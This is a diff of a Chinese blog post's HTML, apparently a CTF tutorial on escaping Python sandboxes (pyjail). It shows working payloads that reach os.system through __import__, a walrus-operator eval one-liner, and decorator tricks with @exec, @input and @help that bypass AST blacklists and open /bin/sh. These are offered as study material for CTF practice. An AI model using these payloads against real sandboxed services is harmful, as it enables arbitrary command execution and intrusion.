-<p>如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在pyjail的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__('os').system('sh')</code>进行RCE；</p>
-<p>读取文件</p>
+</div><p>借助海象表达式，我们可以通过列表来替代多行代码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__import__(&#39;os&#39;).system(&#39;cat ./flag.txt&#39;)
-</span></span><span class="line"><span class="cl">print(open(&#39;/flag.txt&#39;).read())
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;[a:=__import__(&#34;os&#34;),b:=a.system(&#34;id&#34;)]&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">kali</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">),</span><span class="mi">20</span><span class="p">(</span><span class="n">dialout</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="n">cdrom</span><span class="p">),</span><span class="mi">25</span><span class="p">(</span><span class="n">floppy</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">),</span><span class="mi">29</span><span class="p">(</span><span class="n">audio</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="n">dip</span><span class="p">),</span><span class="mi">44</span><span class="p">(</span><span class="n">video</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="n">plugdev</span><span class="p">),</span><span class="mi">109</span><span class="p">(</span><span class="n">netdev</span><span class="p">),</span><span class="mi">119</span><span class="p">(</span><span class="n">wireshark</span><span class="p">),</span><span class="mi">122</span><span class="p">(</span><span class="n">bluetooth</span><span class="p">),</span><span class="mi">134</span><span class="p">(</span><span class="n">scanner</span><span class="p">),</span><span class="mi">142</span><span class="p">(</span><span class="n">kaboxer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;os&#39;</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>get交互式shell</p>
+</div><h3 id="ast-沙箱绕过" class="headerLink">
+    <a href="#ast-%e6%b2%99%e7%ae%b1%e7%bb%95%e8%bf%87" class="header-mark"></a>AST 沙箱绕过</h3><p>装饰器</p>
+<p>利用 payload 如下:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__import__(&#39;os&#39;).system(&#39;sh&#39;)
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@exec
+</span></span><span class="line"><span class="cl">@input
+</span></span><span class="line"><span class="cl">class X:
+</span></span><span class="line"><span class="cl">    pass
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="参考文档" class="headerLink">
+</div><p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; @exec
+</span></span><span class="line"><span class="cl">... @input
+</span></span><span class="line"><span class="cl">... class X:
+</span></span><span class="line"><span class="cl">...     pass
+</span></span><span class="line"><span class="cl">... 
+</span></span><span class="line"><span class="cl">&lt;class &#39;__main__.X&#39;&gt;__import__(&#34;os&#34;).system(&#34;ls&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.</p>
+<p>其实这样的话,构造其实可以有很多,比如直接打开 help 函数.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@help
+</span></span><span class="line"><span class="cl">class X:
+</span></span><span class="line"><span class="cl">    pass
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样可以直接进入帮助文档:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Help</span> <span class="n">on</span> <span class="k">class</span> <span class="n">X</span> <span class="ow">in</span> <span class="n">module</span> <span class="n">__main__</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">X</span><span class="p">(</span><span class="n">builtins</span><span class="o">.</span><span class="n">object</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">Data</span> <span class="n">descriptors</span> <span class="n">defined</span> <span class="n">here</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">__dict__</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>      <span class="n">dictionary</span> <span class="k">for</span> <span class="n">instance</span> <span class="n">variables</span> <span class="p">(</span><span class="k">if</span> <span class="n">defined</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">__weakref__</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>      <span class="n">list</span> <span class="n">of</span> <span class="n">weak</span> <span class="n">references</span> <span class="n">to</span> <span class="n">the</span> <span class="n">object</span> <span class="p">(</span><span class="k">if</span> <span class="n">defined</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">END</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再次输入 !sh 即可打开 /bin/sh</p>
+<h3 id="参考文档" class="headerLink">
     <a href="#%e5%8f%82%e8%80%83%e6%96%87%e6%a1%a3" class="header-mark"></a>参考文档</h3><p><a href="https://zhuanlan.zhihu.com/p/578966149" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/578966149</a></p>
 <p><a href="https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html" target="_blank" rel="noopener noreferrer">https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html</a></p>
-<p><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets</a></p></div>
+<p><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets</a></p>
+<p><a href="https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGKqita%2BFTQx%3DoD#toc-15" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGKqita%2BFTQx%3DoD#toc-15</a></p>
+<p><a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1.html" target="_blank" rel="noopener noreferrer">https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1.html</a></p>
+<p><a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals" target="_blank" rel="noopener noreferrer">https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals</a></p></div>
 
         <div class="post-footer" id="post-footer">
     <div class="post-info">
